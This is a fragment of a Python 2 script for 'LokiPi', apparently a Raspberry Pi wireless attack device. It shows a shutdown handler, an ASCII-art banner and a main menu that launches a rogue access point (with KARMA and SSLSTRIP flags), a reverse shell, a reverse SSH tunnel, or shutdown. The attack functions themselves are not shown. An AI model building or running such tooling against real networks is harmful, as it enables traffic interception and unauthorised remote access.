            subprocess.call(["poweroff" , "-i"])
            subprocess.call(["service" , "lokipi", "stop"])
            
    
    except:
       raise
    finally:
       ui.shutdown()
       display.shutdown()
    pass

############################################################################################################################################
############################################################################################################################################
############################################################################################################################################
############################################################################################################################################
                                         #~~~~~      Main     ~~~~~#
############################################################################################################################################
############################################################################################################################################
############################################################################################################################################
############################################################################################################################################
############################################################################################################################################
############################################################################################################################################
############################################################################################################################################
#                                       ~
#       .M,                 +M         ~
#       :MMMM               MMMM,       ~
#       MM .M             M  MM:       ~
#       .MM.  M           M   MM        ~
#       .MMM                .MMM        ~
#         MM,               MMM.        ~
#         MMM.              MMM         ~
#          MMM            .MMM          ~
#          +M+MMMMMMMM,7MM MM           ~
#           MMM ? ,MMM.MMM MM           ~
#           .MM MM .M DMIMMM            ~
#            MMMMMMMMMM, MMM            ~
#           .M$MM +MMMM MNM,            ~
#            MMMMMMMMM.MMMMN            ~
#            N.OM.MM=MM MM .            ~
#            ...  .. .    :.            ~
#             N           O             ~
#             NM        .M~             ~
#            .8.       MM              ~
#              M..     MM.              ~
#               MM      M               ~
#               .=    .M                ~
#                                       ~
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def main():
    
    ## Get access to the Shared Process Memory Manager Dictionary Object
    ## set up and pass to the Web server Process on creation
    global dictionary
    ## 1 = KARMA Broadcast
    dictionary[1] = False
    ## 2 = SSLSTRIP
    dictionary[2] = False
    
    print dictionary[1]
    ## Start python web server in a Daemon Process
    ## Listening on Port 8080

   ## when main gets recalled this stops the code starting another Web server
    global FLAG_WEBSITE
    if FLAG_WEBSITE == False:
        FLAG_WEBSITE = True
        p = Process(target=loki_web_server.main, args =(dictionary,))
        p.start()
        
    #print FLAG_WEBSITE

    
    
    mainres = ui.list_dialog("<<<<<LokiPi>>>>>", ( "Rogue", "Reverse Shell","SSH tunnel", "Shutdown"), align = 'center')
    
    if mainres[1] == "Rogue":
        rouge()
    
    elif mainres[1] == "Reverse Shell":
        print "RShell"
        ### Needs a test to see if its actually up or not
        ### 
        ui.message("Reverse Shell Up[80]", align = 'center', duration = 3.5)
        RShell = Process(target=reverse_shell)
        RShell.start()
        subprocess.call(["route", "del", "default", "gw", "192.168.1.1",  "eth0"])
        main()
    
    elif mainres[1] ==  "SSH tunnel":
        reverse_ssh_tunnel()
        main()
        
    elif mainres[1] == "Shutdown":
        ui.message("Shutting Down!", align = 'center')
        time.sleep(1.5)
        ui.clear()
        subprocess.call(["poweroff" , "-i"])
        subprocess.call(["service" , "lokipi", "stop"])
        
        
            


if __name__ == "__main__":
    main()



